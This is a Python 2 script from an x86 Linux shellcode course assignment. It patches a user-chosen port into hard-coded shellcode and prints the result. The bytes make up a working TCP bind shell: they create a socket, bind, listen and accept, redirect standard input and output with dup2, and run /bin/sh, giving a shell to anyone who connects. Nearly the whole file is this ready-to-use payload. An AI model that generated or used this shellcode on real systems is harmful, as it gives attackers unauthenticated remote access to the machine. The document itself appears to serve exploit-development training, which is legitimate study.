#!/usr/bin/python

# SLAE Assignment 1: Simple Python Port Change Wrapper Script
# Author:  4p0cryph0n
# Website: https://4p0cryph0n.github.io/

import sys
import socket

port = int(sys.argv[1])

phtons = hex(socket.htons(int(port)))

half1 = phtons[4:]
half2 = phtons[2:4]

if half1 == "00" or half2 == "00":
	print "Port contains NULL"
	exit(1)

shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x6a\\x66\\x58\\x43\\x52'
shellcode += '\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x66\\x58'
shellcode += '\\x43\\x52\\x66\\x68\\x11\\x5b\\x66\\x53\\x89\\xe1\\x6a\\x10'
shellcode += '\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x43\\x43'
shellcode += '\\x53\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x52\\x52\\x56'
shellcode += '\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0'
shellcode += '\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc9'
shellcode += '\\x51\\x6a\\x0b\\x58\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62'
shellcode += '\\x69\\x6e\\x89\\xe3\\xcd\\x80'

shellcode = shellcode.replace('\\x11\\x5b', '\\x{}\\x{}'.format(half1, half2))
print shellcode
